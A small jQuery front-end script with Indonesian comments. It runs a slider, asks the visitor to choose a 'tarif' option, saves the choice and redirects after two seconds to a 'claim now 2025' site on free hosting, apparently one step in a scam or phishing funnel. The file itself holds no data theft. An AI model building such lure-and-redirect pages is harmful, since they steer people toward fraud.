$(document).ready(function () {
    // Inisialisasi slider
    $('.slider').slick({
        autoplay: true,
        autoplaySpeed: 2000,
        dots: true
    });

    // Tambahkan animasi petunjuk saat halaman dimuat
    $('.panel-body label').addClass('pulse');

    // Hentikan animasi saat radio button dipilih
    $('input[name="tarif"]').on('change', function () {
        $('.panel-body label').removeClass('pulse');
    });
});

function pilat(event) {
    event.preventDefault();
    const tarif = $('input[name="tarif"]:checked').val();

    if (tarif) {
        // Jika sudah dipilih, lanjutkan proses
        sessionStorage.setItem('tarif', tarif);
        $("#process1").fadeIn();
        setTimeout(() => {
            window.location.href = 'https://ayo-klaim-sekarang-2025.netlify.app/';
        }, 2000);
    } else {
        // Jika belum dipilih, tambahkan animasi shake
        $('.panel-body label').addClass('shake');

        // Hapus animasi setelah selesai
        setTimeout(() => {
            $('.panel-body label').removeClass('shake');
        }, 500);

        // Tampilkan pesan alert
        alert("Silakan pilih salah satu opsi terlebih dahulu.");
    }
}